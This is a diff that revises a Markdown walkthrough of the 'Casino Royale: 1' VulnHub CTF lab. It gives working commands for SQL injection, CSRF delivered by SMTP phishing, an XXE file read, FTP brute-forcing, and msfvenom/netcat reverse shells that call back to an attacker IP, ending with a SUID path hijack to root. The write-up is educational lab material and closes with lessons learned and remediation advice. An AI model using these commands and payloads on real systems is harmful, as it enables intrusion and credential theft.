@@ -1,234 +1,263 @@
 # Casino Royale: 1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.102 (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.102 |
 | **Difficulty** | Hard |
 | **OS** | Linux |
-| **Credentials** | admin:raise12million (PokerMax), valenka:11archives11! (system), ftpUserULTRA:bankbank (FTP) |
-| **Root Flag** | /root/flag/flag.sh (screenshot only) |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/casino-royale-1,287/) |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/casino-royale-1-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-PokerMax SQLi (admin) → Snowfox CMS (casino-royale.local) → CSRF exploit (EDB-35301) → SMTP trigger → XXE reads /etc/passwd → FTP brute (Hydra) → PHP5 webshell → valenka:11archives11! → SUID mi6_detect_test → writable run.sh → root
+A PokerMax web application is vulnerable to SQL injection, yielding admin credentials. Player profile data reveals a Snowfox CMS running on a vhost, which has a CSRF vulnerability used to add an admin user. Social engineering via SMTP delivers the CSRF payload to an internal user. XXE injection on another endpoint exposes `/etc/passwd` and reveals an FTP user. After Hydra brute-forces the FTP password, a PHP reverse shell is uploaded. Lateral movement via database credentials reaches a user whose SUID binary can be hijacked to execute a root shell payload.
 
 ## Methodology
 
-1. PokerMax admin via SQLmap
-2. Virtual host discovery (casino-royale.local)
-3. Snowfox CSRF to create admin user
-4. SMTP phishing to trigger victim
-5. XXE injection to read /etc/passwd and find FTP user
-6. FTP brute force + PHP webshell upload
-7. DB config credentials → su valenka
-8. SUID binary + writable run.sh in /tmp → root
+1. Host discovery and service enumeration (HTTP, SMTP, FTP)
+2. SQLMap against PokerMax login to dump admin credentials
+3. Exploit-DB CSRF (35301) to add admin user in Snowfox CMS
+4. SMTP phishing to deliver CSRF payload to internal user `valenka`
+5. XXE injection to read `/etc/passwd`
+6. Hydra FTP brute-force; PHP shell upload via FTP
+7. Initial shell via Metasploit; lateral movement via `config.php` credentials
+8. SUID binary abuse for root shell
 
----
-
-## Step 1: Network Discovery
+## Step 1: Host Discovery
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
+netdiscover -r 192.168.1.0/24
+# Target: 192.168.1.102
+
 nmap -sV -p- 192.168.1.102
-# Ports: 80/HTTP, 25/SMTP
+# Open: 21 (FTP), 25 (SMTP), 80 (HTTP)
 ```
 
-![Target discovery](images/01-netdiscover.png)
+![Nmap scan results](images/01-nmap.png)
 
----
-
-## Step 2: PokerMax SQL Injection
+## Step 2: Web Enumeration and PokerMax Admin
 
 ```bash
 dirb http://192.168.1.102/
-# Finds: index.php
-# Source references PokerMax CMS
-searchsploit poker
-# EDB-6766 → admin panel at /pokeradmin/
+# Finds: /index.php, /pokeradmin/
 ```
 
-Dump database:
+The page references **PokerMax** software.
 
 ```bash
-sqlmap -u http://192.168.1.102/pokeradmin/index.php \
-  --forms --risk 3 --level 5 --dbs --batch
-sqlmap -u http://192.168.1.102/pokeradmin/index.php \
-  --forms --risk 3 --level 5 -D pokerleague --dump-all --batch
-# admin : raise12million
+searchsploit poker
+searchsploit -m 6766
+cat 6766.txt
+# Admin login path: /pokeradmin/
 ```
 
-Log in to `/pokeradmin/`. Edit player **Valenka** → reveals directory and domain `casino-royale.local`.
+## Step 3: SQL Injection with SQLMap
 
-![SQLmap DB dump](images/02-sqlmap.png)
+```bash
+# Enumerate databases
+sqlmap -u http://192.168.1.102/pokeradmin/index.php \
+  --forms --risk 3 --level 5 --dbs --batch
 
----
+# Dump all tables from pokerleague database
+sqlmap -u http://192.168.1.102/pokeradmin/index.php \
+  --forms --risk 3 --level 5 -D pokerleague --dump-all --batch
+```
 
-## Step 3: Virtual Host + Snowfox CSRF
+Credentials recovered: **`admin:raise12million`**
+
+Login to `/pokeradmin/` with these credentials.
+
+![SQLMap credentials dump](images/02-sqli.png)
+
+## Step 4: Discover Snowfox CMS via Player Profiles
+
+In the PokerMax admin panel, browse player profiles. A profile references:
+- A directory path with user data
+- The domain `casino-royale.local`
+
+Add the domain to your hosts file:
 
 ```bash
 echo "192.168.1.102  casino-royale.local" >> /etc/hosts
 ```
 
-Browse the directory found in Valenka's profile → **Snowfox CMS**.
+Browsing the site reveals the **Snowfox CMS**.
+
+## Step 5: CSRF Exploit to Add Admin User
 
 ```bash
 searchsploit snowfox
 searchsploit -m 35301
-# Edit raj.html: set new admin credentials
-cp raj.html /var/www/html/
+cat 35301.txt
+```
+
+Edit the exploit into `raj.html` (replace attacker IP with `192.168.1.107`). Start Apache to serve it:
+
+```bash
+cp 35301.txt /var/www/html/raj.html
+# Edit raj.html to set your attacker IP
 service apache2 start
 ```
 
----
+## Step 6: SMTP Phishing to Deliver CSRF Payload
 
-## Step 4: SMTP Social Engineering
+Send a phishing email to `valenka` with a link to the CSRF page:
 
-Send the exploit link to Valenka via SMTP:
-
-```
+```bash
 telnet casino-royale.local 25
-HELO attacker
-MAIL FROM: <attacker@attacker.com>
-RCPT TO: <valenka@casino-royale.local>
+EHLO attacker
+MAIL FROM: admin@casino-royale.local
+RCPT TO: valenka@casino-royale.local
 DATA
-Subject: Check this link
+Subject: Important Update
 
-http://192.168.1.107/raj.html
-
+Please click here: http://192.168.1.107/raj.html
 .
 QUIT
 ```
 
-Monitor Apache log for the victim request:
+Monitor the Apache access log to confirm the victim opens the link:
 
 ```bash
-tail -f /var/log/apache2/access.log
+tail -n1 -f /var/log/apache2/access.log
 ```
 
-Log in to `casino-royale.local/vip-client-portfolios/?uri=signin` with credentials from raj.html. Find second directory in player **le@casino-royale.local** profile.
+## Step 7: Login as New Admin and Navigate to VIP Portal
 
----
+Use the CSRF-created credentials (e.g., `user@user.local:password`) to log in to the Snowfox CMS. Browse the `vip-client-portfolios` section to find more user data and a new hidden path.
 
-## Step 5: XXE Injection
+## Step 8: XXE Injection to Read /etc/passwd
 
-The `/ultra-access-view/main.php` endpoint is vulnerable to XXE:
+The new directory's page processes XML. Create an XXE payload file `xml.txt`:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<root><user>&xxe;</user></root>
+```
+
+Send it:
 
 ```bash
-cat > /tmp/xml.txt << 'EOF'
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ELEMENT foo ANY>
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<foo>&xxe;</foo>
-EOF
-curl -d @/tmp/xml.txt http://casino-royale.local/ultra-access-view/main.php
+curl -d @xml.txt http://casino-royale.local/ultra-access-view/main.php
 ```
 
-Response includes `/etc/passwd`, revealing FTP user: **ftpUserULTRA**
+The response returns the contents of `/etc/passwd`, revealing the user **ftpUserULTRA**.
 
-![XXE reading /etc/passwd](images/03-xxe.png)
+![XXE leaking /etc/passwd](images/03-xxe.png)
 
----
-
-## Step 6: FTP Brute + PHP5 Webshell
+## Step 9: FTP Brute-Force with Hydra
 
 ```bash
-hydra -l ftpUserULTRA -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.102
-# ftpUserULTRA : bankbank
+hydra -l ftpUserULTRA -P /usr/share/wordlists/rockyou.txt \
+  ftp://192.168.1.102
 ```
 
-Generate PHP Meterpreter payload (server allows only .php5):
+Password found: **`bankbank`**
+
+## Step 10: Upload PHP Reverse Shell via FTP
+
+Generate the shell (`.php5` extension accepted by the server):
 
 ```bash
 msfvenom -p php/meterpreter/reverse_tcp \
-  lhost=192.168.1.107 lport=443 -f raw > shell.php5
+  LHOST=192.168.1.107 LPORT=443 -f raw > shell.php5
 ```
 
 Upload via FTP:
 
 ```bash
 ftp 192.168.1.102
-# user: ftpUserULTRA  pass: bankbank
+# Login: ftpUserULTRA / bankbank
 put shell.php5
 chmod 777 shell.php5
+bye
 ```
 
-Start handler and trigger:
+Start the Metasploit handler:
 
 ```bash
-msfconsole -q -x "use multi/handler; set payload php/meterpreter/reverse_tcp; set lhost 192.168.1.107; set lport 443; exploit"
-curl http://casino-royale.local/<ftp_dir>/shell.php5
+msfconsole -q
+use exploit/multi/handler
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 192.168.1.107
+set LPORT 443
+exploit
 ```
 
----
+Browse to the uploaded shell URL to trigger execution. A Meterpreter session opens.
 
-## Step 7: Lateral Movement (valenka)
+![Shell via PHP upload](images/04-shell.png)
+
+## Step 11: Stabilize Shell and Lateral Movement
 
 ```bash
-cat config.php
-# DB_USER=valenka, DB_PASS=11archives11!
+python -c "import pty; pty.spawn('/bin/bash')"
+
+# Find database credentials
+cat /var/www/html/config.php
+# valenka:11archives11!
+
 su valenka
-# password: 11archives11!
+# Password: 11archives11!
 ```
 
----
-
-## Step 8: SUID Binary → Root
+## Step 12: Privilege Escalation via SUID Binary
 
 ```bash
 find / -perm -4000 2>/dev/null
-# /opt/casino-royale/mi6_detect_test (SUID root)
+# /opt/casino-royale/mi6_detect_test
 ```
 
-![SUID binary found](images/04-suid.png)
-
-The binary calls `run.sh` in `/opt/casino-royale/`, which doesn't exist. Create a reverse shell payload instead:
+The binary attempts to execute `run.sh` from the current path. It is not found, so create a malicious one:
 
 ```bash
-# On attacker:
-cat > /tmp/run.sh << 'EOF'
-#!/bin/bash
-bash -i >& /dev/tcp/192.168.1.107/1234 0>&1
-EOF
-python3 -m http.server 8000
+# Generate netcat reverse shell payload
+msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.1.107 LPORT=1234 \
+  -f raw > /tmp/run.sh
+chmod +x /tmp/run.sh
 
-# On target (as valenka):
+# Start listener
+nc -lvp 1234
+
+# In another terminal, serve and download the payload
+python -m SimpleHTTPServer 8080
+# From target shell:
+wget http://192.168.1.107:8080/run.sh -O /tmp/run.sh
+
+# Trigger the SUID binary from /tmp
 cd /tmp
-wget http://192.168.1.107:8000/run.sh
-chmod +x run.sh
+/opt/casino-royale/mi6_detect_test
 ```
 
-Start listener: `nc -lvnp 1234`
+A root shell arrives on the listener.
+
+## Step 13: Root Flag
 
 ```bash
-/opt/casino-royale/mi6_detect_test
-# Shell returns as root
-id
-# uid=0(root)
-cat /root/flag/flag.sh
+whoami
+# root
+cd /root
+ls
+cat flag.sh
 ```
 
-![Root flag](images/05-root.png)
-
----
+![Root shell and flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **SQLi in admin panel** — CMS login forms without parameterised queries allow full DB dump
-2. **XXE in XML endpoints** — validate and disable external entity resolution; use safe XML parsers
-3. **FTP with weak password** — require strong credentials; disable FTP, use SFTP
-4. **SUID calling relative paths** — always use absolute paths in SUID binaries; validate that helper scripts exist
-5. **CSRF + SMTP phishing** — CSRF tokens alone don't prevent client-side attack delivery via email
+- SQL injection against legacy poker software exposed admin credentials in a single command; always use prepared statements.
+- CSRF vulnerabilities in CMSes can be weaponized by combining them with social engineering (SMTP phishing), requiring no direct exploit of the victim's machine.
+- XXE injection remains a serious vulnerability in XML-processing endpoints; it can exfiltrate any file readable by the web server process.
+- SUID binaries that execute relative paths (e.g., `run.sh` without an absolute path) are trivially hijackable via `PATH` manipulation or placing a malicious script in the working directory.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| PokerMax SQLi | Parameterise all queries |
-| Snowfox CSRF | Implement CSRF tokens and SameSite cookies |
-| XXE in main.php | Disable external entities in XML parser (LIBXML_NOENT off) |
-| FTP weak password | Enforce strong credentials, prefer SFTP |
-| SUID relative path call | Use absolute paths, validate script presence |
-| DB credentials in config.php | Use environment variables, restrict file permissions |
+|---|---|
+| PokerMax SQL injection | Use parameterized queries; upgrade or replace legacy software |
+| Snowfox CMS CSRF (35301) | Implement CSRF tokens; upgrade CMS |
+| SMTP relay accepts arbitrary senders | Configure SMTP to reject unauthorized senders; disable open relay |
+| XXE in XML endpoint | Disable external entity processing in the XML parser |
+| FTP user with weak password | Enforce strong passwords; consider replacing FTP with SFTP |
+| SUID binary relative path execution | Use absolute paths in SUID binaries; audit all custom SUID files |
